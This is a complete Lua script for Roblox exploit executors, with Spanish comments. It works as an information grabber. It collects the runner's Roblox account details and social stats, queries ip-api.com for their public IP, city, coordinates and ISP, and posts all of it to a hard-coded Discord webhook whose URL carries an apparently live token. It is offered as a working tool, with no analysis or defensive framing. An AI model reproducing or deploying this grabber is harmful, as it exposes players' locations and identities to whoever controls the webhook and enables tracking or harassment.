local http = (syn and syn.request) or (http and http.request) or http_request or request
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local Stats = game:GetService("Stats")
local UserInputService = game:GetService("UserInputService")
local LocalizationService = game:GetService("LocalizationService")

-- Sustituye esto por la URL de tu webhook
local webhookUrl = "https://discord.com/api/webhooks/1543610254938607757/abhK1z7eAhL2RICV9ezb1SN1BsPshkw6DqV45ayQA5pRfX_S8BUYA_Ykxvo4mK821yNQ"

if not http then 
    warn("Tu ejecutor no soporta funciones de peticiones HTTP.")
    return 
end

local player = Players.LocalPlayer
local userId = player.UserId
local username = player.Name
local displayName = player.DisplayName
local accountAge = player.AccountAge
local membershipType = player.MembershipType.Name
local teamName = player.Team and player.Team.Name or "Sin Equipo"

-- 1. APIS DE GEOLOCALIZACIÓN Y RED
local ipData = { query = "N/A", country = "N/A", countryCode = "N/A", regionName = "N/A", city = "N/A", zip = "N/A", lat = "N/A", lon = "N/A", timezone = "N/A", isp = "N/A", org = "N/A", as = "N/A" }
pcall(function()
    local res = http({ Url = "http://ip-api.com/json/?fields=66846719", Method = "GET" })
    if res and res.Body then
        ipData = HttpService:JSONDecode(res.Body)
    end
end)

-- 2. APIS PÚBLICAS DE ROBLOX

-- Social (Amigos, Seguidores, Siguiendo)
local friendsCount, followersCount, followingsCount = "0", "0", "0"
pcall(function()
    local res = http({ Url = "https://friends.roblox.com/v1/users/" .. userId .. "/friends/count", Method = "GET" })
    if res and res.Body then friendsCount = tostring(HttpService:JSONDecode(res.Body).count) end
end)
pcall(function()
    local res = http({ Url = "https://friends.roblox.com/v1/users/" .. userId .. "/followers/count", Method = "GET" })
    if res and res.Body then followersCount = tostring(HttpService:JSONDecode(res.Body).count) end
end)
pcall(function()
    local res = http({ Url = "https://friends.roblox.com/v1/users/" .. userId .. "/followings/count", Method = "GET" })
    if res and res.Body then followingsCount = tostring(HttpService:JSONDecode(res.Body).count) end
end)

-- Grupos y Roles
local groupsSummary = "Sin grupos"
pcall(function()
    local res = http({ Url = "https://groups.roblox.com/v1/users/" .. userId .. "/groups/roles", Method = "GET" })
    if res and res.Body then
        local data = HttpService:JSONDecode(res.Body).data
        local groupList = {}
        for i = 1, math.min(#data, 4) do
            table.insert(groupList, "• " .. data[i].group.name .. " (`" .. data[i].role.name .. "`)")
        end
        if #groupList > 0 then groupsSummary = table.concat(groupList, "\n") end
    end
end)

-- Presence API (Estado en línea)
local userPresence = "Desconocido"
pcall(function()
    local res = http({
        Url = "https://presence.roblox.com/v1/presence/users",
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode({ userIds = { userId } })
    })
    if res and res.Body then
        local userState = HttpService:JSONDecode(res.Body).userPresences[1]
        if userState then userPresence = userState.lastLocation end
    end
end)

-- Avatar API (Tipo de rig de avatar R6 / R15)
local avatarType = "Desconocido"
pcall(function()
    local res = http({ Url = "https://avatar.roblox.com/v1/users/" .. userId .. "/avatar", Method = "GET" })
    if res and res.Body then
        avatarType = HttpService:JSONDecode(res.Body).playerAvatarType
    end
end)

-- Badges API (Insignias del usuario en la experiencia)
local badgeCount = "0"
pcall(function()
    local res = http({ Url = "https://badges.roblox.com/v1/users/" .. userId .. "/badges?limit=10", Method = "GET" })
    if res and res.Body then
        local data = HttpService:JSONDecode(res.Body).data
        badgeCount = tostring(#data)
    end
end)

-- 3. RENDIMIENTO Y HARDWARE
local totalRamMB = math.floor(Stats:GetTotalMemoryUsageMb())
local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
local fps = math.floor(workspace:GetRealPhysicsFPS())

local viewportSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(0,0)
local resolutionStr = math.floor(viewportSize.X) .. "x" .. math.floor(viewportSize.Y)

local platform = "PC / Laptop"
if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    platform = "Móvil / Tablet"
elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
    platform = "Consola"
end

-- 4. JUEGO Y SERVIDOR
local placeId = game.PlaceId
local gameId = game.GameId
local jobId = game.JobId
local serverSize = #Players:GetPlayers() .. " / " .. Players.MaxPlayers

local gameName, creatorName, creatorId = "Desconocido", "Desconocido", "0"
pcall(function()
    local productInfo = MarketplaceService:GetProductInfo(placeId)
    gameName = productInfo.Name
    creatorName = productInfo.Creator.Name
    creatorId = tostring(productInfo.Creator.CreatorTargetId)
end)

-- Recopilación de Enlaces
local profileLink = "https://www.roblox.com/users/" .. userId .. "/profile"
local gameLink = "https://www.roblox.com/games/" .. placeId
local serverLink = "https://www.roblox.com/games/" .. placeId .. "?jobId=" .. jobId
local avatarImageUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"

local executorName = identifyexecutor and identifyexecutor() or getexecutorname and getexecutorname() or "Desconocido"

-- CONSTRUCCIÓN DEL EMBED DE DISCORD
local payload = {
    embeds = {
        {
            title = "🌐 **Informe Avanzado de Cuenta y Sistema**",
            color = 3447003,
            fields = {
                {
                    name = "👤 **Perfil y Cuenta (Roblox API)**",
                    value = "• **Usuario:** [" .. displayName .. " (@" .. username .. ")](" .. profileLink .. ")\n" ..
                            "• **User ID:** `" .. tostring(userId) .. "`\n" ..
                            "• **Edad de Cuenta:** " .. tostring(accountAge) .. " días\n" ..
                            "• **Membresía:** " .. membershipType .. "\n" ..
                            "• **Avatar Rig:** " .. avatarType .. "\n" ..
                            "• **Equipo:** " .. teamName,
                    inline = false
                },
                {
                    name = "👥 **Estadísticas Sociales (Social API)**",
                    value = "• **Amigos:** " .. friendsCount .. "\n" ..
                            "• **Seguidores:** " .. followersCount .. "\n" ..
                            "• **Siguiendo:** " .. followingsCount .. "\n" ..
                            "• **Ubicación en Plataforma:** " .. userPresence,
                    inline = true
                },
                {
                    name = "🏆 **Insignias Recientes**",
                    value = "• **Badges Obtenidas:** " .. badgeCount,
                    inline = true
                },
                {
                    name = "🛡️ **Grupos (Groups API)**",
                    value = groupsSummary,
                    inline = false
                },
                {
                    name = "📍 **Geolocalización y Red (ip-api)**",
                    value = "• **IP Pública:** `" .. tostring(ipData.query) .. "`\n" ..
                            "• **País:** " .. tostring(ipData.country) .. " (" .. tostring(ipData.countryCode) .. ")\n" ..
                            "• **Ciudad/Región:** " .. tostring(ipData.city) .. ", " .. tostring(ipData.regionName) .. "\n" ..
                            "• **Coordenadas:** `" .. tostring(ipData.lat) .. ", " .. tostring(ipData.lon) .. "`\n" ..
                            "• **ISP / ASN:** " .. tostring(ipData.isp) .. " (" .. tostring(ipData.as) .. ")\n" ..
                            "• **Zona Horaria:** " .. tostring(ipData.timezone),
                    inline = false
                },
                {
                    name = "💻 **Hardware y Cliente**",
                    value = "• **Ejecutor:** `" .. executorName .. "`\n" ..
                            "• **Plataforma:** " .. platform .. "\n" ..
                            "• **Resolución:** `" .. resolutionStr .. "`\n" ..
                            "• **Memoria Asignada:** `" .. tostring(totalRamMB) .. " MB`\n" ..
                            "• **Rendimiento:** " .. tostring(fps) .. " FPS | " .. tostring(ping) .. " ms\n" ..
                            "• **Idioma:** " .. LocalizationService.RobloxLocaleId,
                    inline = false
                },
                {
                    name = "🎮 **Juego y Servidor**",
                    value = "• **Nombre:** [" .. gameName .. "](" .. gameLink .. ")\n" ..
                            "• **Creador:** " .. creatorName .. " (ID: `" .. creatorId .. "`)\n" ..
                            "• **Place ID:** `" .. tostring(placeId) .. "` | **Game ID:** `" .. tostring(gameId) .. "`\n" ..
                            "• **Jugadores:** " .. serverSize .. "\n" ..
                            "• **Enlace Servidor:** [Unirse al Servidor Directamente](" .. serverLink .. ")",
                    inline = false
                }
            },
            image = {
                url = avatarImageUrl
            },
            footer = {
                text = "Registro mediante APIs externas"
            },
            timestamp = DateTime.now():ToIsoDate()
        }
    }
}

-- PETICIÓN POST AL WEBHOOK DE DISCORD
local response = http({
    Url = webhookUrl,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = HttpService:JSONEncode(payload)
})

if response.StatusCode == 200 or response.StatusCode == 204 then
    print("Información completa enviada al webhook.")
else
    warn("Error al enviar el webhook. Código HTTP: " .. tostring(response.StatusCode))
end
